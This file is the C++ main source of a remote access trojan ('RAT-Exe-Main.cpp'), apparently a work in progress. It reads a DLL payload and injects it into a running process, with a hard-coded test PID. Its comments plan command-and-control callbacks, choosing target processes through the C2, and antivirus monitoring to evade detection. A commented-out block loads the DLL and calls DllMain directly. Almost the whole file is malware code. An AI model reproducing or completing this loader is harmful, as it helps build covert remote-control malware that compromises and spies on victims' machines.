// Patrick Sacchet
// Version 1.0
// RAT-Exe-Main.cpp : This file contains the 'main' function. Program execution begins and ends there.

#include "RAT-Exe-Main.h"
#include "RAT-Exe-Injection.h"


INT main()
{
    INT status = ERROR_SUCCESS;
    HANDLE hFile;
    DWORD dwBytesRead = 0;
    CHAR msgBuf[MAX_BUFFER_SIZE], *fileContents = NULL, *fileBytes = NULL;
    UINT64 fileSize = 0;
    char filePath [] = "C:\\RAT-Dll.dll";
    DWORD lastError, bufferSize;
    LPCWSTR dllName = DLL_NAME;
    HMODULE hGetProcIDLL = LoadLibrary(dllName);

    OutputDebugStringA("RAT-Exe-Main::main - Initializing program...\n");


    // First, parse processes on the system we can see to inject our DLL into; send these back to our C2 to see which to inject into

    // Read in payload; get size
   
    status = readPayload(filePath, &fileSize, &fileBytes);
    if (status != ERROR_SUCCESS)
    {
        sprintf_s(msgBuf, "RAT-Exe::main - Failure from readPayload %d\n", status);
        OutputDebugStringA(msgBuf);
        goto cleanup;
    }


    
    // lets just test inject first to get that working 
        // paint inject test 
    status = inject(2592, fileSize, fileBytes);
    if (status != ERROR_SUCCESS)
    {
        sprintf_s(msgBuf, "RAT-Exe::main - Failure from inject %d\n", status);
        OutputDebugStringA(msgBuf);
        goto cleanup;
    }
    else
    {
        OutputDebugStringA("RAT-Exe::main - Successfully injected payload\n");
    }




    // If we are in a 'operational' space load our DLL into memory so it can call back to our client 
    

    /*/if (!hGetProcIDLL)
    {
        // why do we end up here 
        OutputDebugStringA("RAT-Exe-Main.cpp::main - Could not successfully load target DLL\n");
        lastError = GetLastError();
        sprintf_s(msgBuf, "RAT-Exe-Main::main - Last error: %08x) \n", lastError);
        OutputDebugStringA(msgBuf);
        return FAILURE;
    }

    OutputDebugStringA("RAT-Exe.cpp-Main::main - Successfully loaded target DLL\n");

    // Grab proc address to call into 
    typedef UINT (WINAPI* DLLFUNCPOINT) (HMODULE,DWORD,LPVOID);
    DLLFUNCPOINT DllFuncPoint;
    DllFuncPoint = (DLLFUNCPOINT)GetProcAddress(hGetProcIDLL, "DllMain");
    if (!DllFuncPoint)
    {
        printf("Failed to get function pointer in DLL!\n");
        FreeLibrary(hGetProcIDLL);
        return FAILURE;
    }

    else
    {
        UINT returnValue = 0;
        returnValue = DllFuncPoint(hGetProcIDLL, DLL_PROCESS_ATTACH, NULL);

        if (!returnValue)
        {
            OutputDebugStringA("RAT-Exe-Main.cpp::main - Call to DLL main failed \n");
            return FAILURE;
        }

        else
        {
            OutputDebugStringA("RAT-Exe-Main.cpp::main - Call to DLL main was successful! \n");
            FreeLibrary(hGetProcIDLL);
            return SUCCESS;
        }
    }
    */

    // While our DLL handles commands from client continue to survey the system, calling DLL_PROCESS_DETACH once we suspect a threat
    // TODO: Implement further antivirus monitoring 
cleanup:
    return status;
}


